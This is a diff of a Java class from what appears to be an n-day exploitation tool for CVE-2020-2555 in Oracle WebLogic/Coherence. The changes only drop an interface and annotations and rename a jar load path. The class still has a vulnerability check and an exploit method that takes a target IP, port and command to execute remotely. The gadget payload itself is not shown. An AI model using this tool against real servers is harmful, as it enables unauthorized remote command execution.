@@ -39,7 +39,7 @@ import static org.apache.commons.lang3.StringUtils.isBlank;
 @Dependencies({":LimitFilter"})
 @Versions({"12.1.3.0", "12.2.1.3.0", "12.2.1.4.0"})
 @Tags({"Nday"})
-public class CVE_2020_2555 implements VulTest {
+public class CVE_2020_2555{
 
     /**
      * 漏洞影响版本
@@ -79,7 +79,6 @@ public class CVE_2020_2555 implements VulTest {
      * @return 漏洞存在返回 true 否则返回 false
      * @throws Exception 抛出异常
      */
-    @Override
     public Boolean vulnerable(String ip, Integer port, String... param) throws Exception {
         this.bindName = getRandomString(16);
         ContextPojo contextPojo = rebindAny(ip,port,bindName,param);
@@ -112,7 +111,6 @@ public class CVE_2020_2555 implements VulTest {
      * @param port 端口
      * @throws Exception 抛出异常
      */
-    @Override
     public String exploit(String ip, Integer port, String... param) throws Exception {
         String cmd = param[0];
         if(isBlank(cmd)){
@@ -120,7 +118,6 @@ public class CVE_2020_2555 implements VulTest {
         }
         return callInfo(cmd, remote);
     }
-
 
     /**
      * rebindAny
@@ -188,7 +185,7 @@ public class CVE_2020_2555 implements VulTest {
                 continue;
             }
             version = version.replace(".0.0", ".0");
-            String loadPath = path + version+"/"+ POC_NAME;
+            String loadPath = path + version+"/"+ DEPENDENCIES;
             System.out.println("[*] load class coherence.jar version --> "+version);
             System.out.println("[*] coherence path --> "+loadPath);
             URL[] urls = new URL[]{new URL("file:"+loadPath)};
